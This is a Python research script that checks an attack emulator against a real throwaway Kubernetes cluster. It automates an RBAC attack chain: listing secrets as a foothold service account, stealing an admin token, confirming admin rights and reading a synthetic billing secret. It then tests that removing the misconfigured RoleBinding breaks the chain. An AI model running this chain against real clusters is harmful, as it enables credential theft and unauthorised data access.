"""G3 real-infrastructure fidelity for s1_rbac_secret_lateral on real Kubernetes.

Reproduces the emulator's RBAC secret-lateral chain against a real (kind) cluster
using real Kubernetes API calls, and measures how faithfully the deterministic
emulator matches reality:

  transition-level agreement : fraction of emulator milestones whose real analog
                               fires (succeeds) on the cluster
  observation-level agreement: do the facts the real recon reveals match what the
                               emulator discloses (the admin SA token secret)
  reachability gap           : |emulator stage-reachability - real stage-reachability|
  failure-mode taxonomy      : classified reason for any step that does not fire
  defense fidelity           : removing the misconfig (the over-permissive
                               RoleBinding) must break the chain on the cluster,
                               matching the emulator's disabled-misconfig behavior

The real chain (attacker holds only the foothold SA token):
  1. recon   : list secrets in cnab-priv           -> reveals admin-sa-token
  2. privesc : read admin-sa-token secret           -> steals admin token
  3. context : admin token `auth can-i` cluster-wide -> confirms admin context
  4. exfil   : admin token reads billing datastore   -> goal (synthetic data)

Safety: synthetic data only, read-only exfil, ephemeral kind cluster, teardown at
end. Requires kubectl pointed at a THROWAWAY cluster (K8s>=1.24 for TokenRequest).
Usage:
    python k8s/fidelity/measure_k8s_fidelity.py --cluster "kind v1.31"
"""

from __future__ import annotations

import argparse
import base64
import json
import subprocess
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(REPO))   # パス指定実行でも cnab パッケージを import 可能にする
MANIFESTS = Path(__file__).resolve().parent / "manifests.yaml"
RB = ("rolebinding", "cnab-foothold-secret-read", "-n", "cnab-priv")  # the misconfig edge


def _kubectl(*args, kubeconfig: str | None = None, check: bool = False):
    # 既定（kubeconfig=None）はクラスタ管理者（フィクスチャ適用・撤去・トークン発行）。
    # 攻撃者としての呼び出しは、SA トークンだけを credential にした専用 kubeconfig を渡す。
    cmd = ["kubectl", *args]
    if kubeconfig:
        cmd += [f"--kubeconfig={kubeconfig}"]
    return subprocess.run(cmd, text=True, capture_output=True, check=check)


# 現行コンテキストのサーバ URL と CA（クライアント証明書は使わない）。
_SERVER = ""
_CA = ""
_TMP: list[str] = []


def _load_cluster_conn() -> None:
    global _SERVER, _CA
    _SERVER = _kubectl("config", "view", "--raw", "--minify", "-o",
                       "jsonpath={.clusters[0].cluster.server}").stdout.strip()
    _CA = _kubectl("config", "view", "--raw", "--minify", "-o",
                   "jsonpath={.clusters[0].cluster.certificate-authority-data}"
                   ).stdout.strip()


def _identity_kubeconfig(token: str) -> str:
    """SA トークンのみを credential とする一時 kubeconfig を書き出しパスを返す。

    kind の既定 kubeconfig はクライアント証明書（cluster-admin）で認証するため、
    `kubectl --token=...` を足しても証明書が優先されて全呼び出しが admin になる。
    ここではクライアント証明書を含めず token だけを載せ、確実に SA として認証させる。
    """
    import tempfile
    cluster: dict = {"server": _SERVER}
    if _CA:
        cluster["certificate-authority-data"] = _CA
    else:
        cluster["insecure-skip-tls-verify"] = True
    cfg = {
        "apiVersion": "v1", "kind": "Config",
        "clusters": [{"name": "c", "cluster": cluster}],
        "users": [{"name": "u", "user": {"token": token}}],
        "contexts": [{"name": "ctx", "context": {"cluster": "c", "user": "u"}}],
        "current-context": "ctx",
    }
    fh = tempfile.NamedTemporaryFile("w", suffix=".kubeconfig", delete=False)
    json.dump(cfg, fh)   # JSON は妥当な YAML なので kubeconfig として読める
    fh.close()
    _TMP.append(fh.name)
    return fh.name


def _classify_failure(stderr: str) -> str:
    s = stderr.lower()
    if "forbidden" in s or "cannot " in s:
        return "AccessDenied(RBAC)"
    if "notfound" in s or "not found" in s:
        return "NotFound"
    if "unauthorized" in s:
        return "Unauthorized"
    if "timeout" in s or "timed out" in s:
        return "Timeout"
    return "Other" if s.strip() else "None"


def _b64d(s: str) -> str:
    try:
        return base64.b64decode(s).decode("utf-8", "replace")
    except Exception:  # noqa
        return ""


def _foothold_token() -> str:
    cp = _kubectl("create", "token", "foothold-sa", "-n", "cnab-app",
                  "--duration=10m")
    return cp.stdout.strip()


def run_chain(foothold_token: str) -> dict:
    """Execute the real attack chain as the foothold SA; return per-step results."""
    steps = []
    fcfg = _identity_kubeconfig(foothold_token)   # 攻撃者＝foothold SA として認証

    # 1. recon: list secrets in cnab-priv as the foothold SA
    r = _kubectl("get", "secrets", "-n", "cnab-priv", "-o", "name", kubeconfig=fcfg)
    revealed = [ln.split("/")[-1] for ln in r.stdout.split() if ln]
    recon_ok = r.returncode == 0 and any("admin-sa-token" in x for x in revealed)
    steps.append({"milestone": "recon", "fired": recon_ok,
                  "observation": revealed,
                  "failure": None if recon_ok else _classify_failure(r.stderr)})

    # 2. privesc: read the admin SA token secret AS the foothold SA (theft)
    admin = ""
    r2 = _kubectl("get", "secret", "admin-sa-token", "-n", "cnab-priv",
                  "-o", "jsonpath={.data.token}", kubeconfig=fcfg)
    if r2.returncode == 0 and r2.stdout.strip():
        admin = _b64d(r2.stdout.strip())
    cred_ok = bool(admin)
    steps.append({"milestone": "cred_admin_sa", "fired": cred_ok,
                  "observation": "admin token stolen" if cred_ok else "",
                  "failure": None if cred_ok else _classify_failure(r2.stderr)})

    acfg = _identity_kubeconfig(admin) if admin else None

    # 3. context: confirm admin authority with the stolen token
    ctx_ok = False
    r3 = None
    if acfg:
        r3 = _kubectl("auth", "can-i", "get", "secrets", "-A", kubeconfig=acfg)
        ctx_ok = r3.stdout.strip() == "yes"
    steps.append({"milestone": "admin_context", "fired": ctx_ok,
                  "observation": "cluster-wide admin" if ctx_ok else "",
                  "failure": None if ctx_ok
                  else _classify_failure(r3.stderr if r3 else "no admin token")})

    # 4. exfil: read the billing datastore with the stolen admin token (goal)
    exfil_ok = False
    r4 = None
    if acfg:
        r4 = _kubectl("get", "secret", "billing-data", "-n", "cnab-data",
                      "-o", "jsonpath={.data.records}", kubeconfig=acfg)
        if r4.returncode == 0 and r4.stdout.strip():
            exfil_ok = _b64d(r4.stdout.strip()).startswith("SYNTHETIC-CNAB-FIXTURE")
    steps.append({"milestone": "exfil_billing", "fired": exfil_ok,
                  "observation": ("synthetic billing data read" if exfil_ok else ""),
                  "failure": None if exfil_ok
                  else _classify_failure(r4.stderr if r4 else "no admin token")})
    return {"steps": steps, "reached": sum(1 for s in steps if s["fired"]),
            "total": len(steps), "goal": steps[-1]["fired"]}


def emulator_baseline() -> dict:
    """Run the emulator's s1 with C2 for the reference reachability."""
    from cnab.runner import run_seeds
    from cnab.scenario import load_file
    sc = load_file(str(REPO / "scenarios" / "s1_rbac_secret_lateral.yaml"))
    recs = [r.record for r in run_seeds(sc, config_id="C2", model="medium",
                                        budget=32, seeds=[0])]
    r = recs[0]
    return {"stage_reachability": r.stage_reachability, "goal": r.goal_reached,
            "milestones": len(sc.milestones)}


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--cluster", default="unspecified", help="provenance note")
    ap.add_argument("--out", default=str(REPO / "results" / "k8s_fidelity_s1.json"))
    args = ap.parse_args()

    try:
        _kubectl("version", "-o", "json", check=True)
    except Exception as exc:  # noqa
        sys.exit(f"kubectl がクラスタに接続できません: {exc}")

    # SA 認証用にサーバ URL・CA を取得（クライアント証明書は使わない）
    _load_cluster_conn()
    if not _SERVER:
        sys.exit("クラスタのサーバ URL を取得できませんでした")

    # エミュレータ基準値はクラスタ不要。apply 前に計算して import 等の失敗を早期検知し、
    # フィクスチャをクラスタに残さない。
    emu = emulator_baseline()

    print("[apply] fixture ...")
    _kubectl("apply", "-f", str(MANIFESTS), check=True)
    try:
        # wait for the token controller to populate the admin SA token secret
        for _ in range(30):
            r = _kubectl("get", "secret", "admin-sa-token", "-n", "cnab-priv",
                         "-o", "jsonpath={.data.token}")
            if r.returncode == 0 and r.stdout.strip():
                break
            time.sleep(1)
        else:
            sys.exit("admin SA token secret が populate されませんでした")

        foothold = _foothold_token()
        if not foothold:
            sys.exit("foothold-sa トークンを取得できませんでした（K8s>=1.24?）")

        # --- attack succeeds with the misconfig in place ---
        attack = run_chain(foothold)

        # --- defense fidelity: remove the misconfig edge, chain must break ---
        _kubectl("delete", *RB, "--ignore-not-found")
        time.sleep(2)
        defended = run_chain(_foothold_token())
    finally:
        _teardown()   # apply 後は成功・失敗によらず必ず撤去

    real_reach = attack["reached"] / attack["total"]
    reach_gap = round(abs(emu["stage_reachability"] - real_reach), 4)
    transition_agreement = round(
        sum(1 for s in attack["steps"] if s["fired"]) / attack["total"], 4)
    obs_agreement = attack["steps"][0]["fired"] and \
        any("admin-sa-token" in x for x in attack["steps"][0]["observation"])
    failure_modes = [{"milestone": s["milestone"], "mode": s["failure"]}
                     for s in attack["steps"] if s["failure"]]
    defense_breaks = (not defended["goal"])

    report = {
        "scenario": "s1_rbac_secret_lateral",
        "cluster": args.cluster,
        "emulator": {"stage_reachability": emu["stage_reachability"],
                     "goal": emu["goal"]},
        "real": {"stage_reachability": round(real_reach, 4),
                 "goal": attack["goal"], "steps": attack["steps"]},
        "transition_level_agreement": transition_agreement,
        "observation_level_agreement": bool(obs_agreement),
        "reach_gap": reach_gap,
        "failure_mode_taxonomy": failure_modes or "none (full chain fired)",
        "defense_fidelity": {
            "misconfig_removed": "cnab-foothold-secret-read (excessive_rbac_secrets)",
            "real_goal_after_removal": defended["goal"],
            "chain_breaks_like_emulator": defense_breaks,
            "break_point": next((s["milestone"] for s in defended["steps"]
                                 if not s["fired"]), None),
        },
    }
    Path(args.out).write_text(json.dumps(report, ensure_ascii=False, indent=2))
    print(json.dumps(report, ensure_ascii=False, indent=2))
    print(f"\n[saved] {args.out}")


def _teardown() -> None:
    _kubectl("delete", "-f", str(MANIFESTS), "--ignore-not-found", "--wait=false")
    import os
    for p in _TMP:                     # 一時 kubeconfig（SA トークン入り）を消す
        try:
            os.unlink(p)
        except OSError:
            pass


if __name__ == "__main__":
    main()
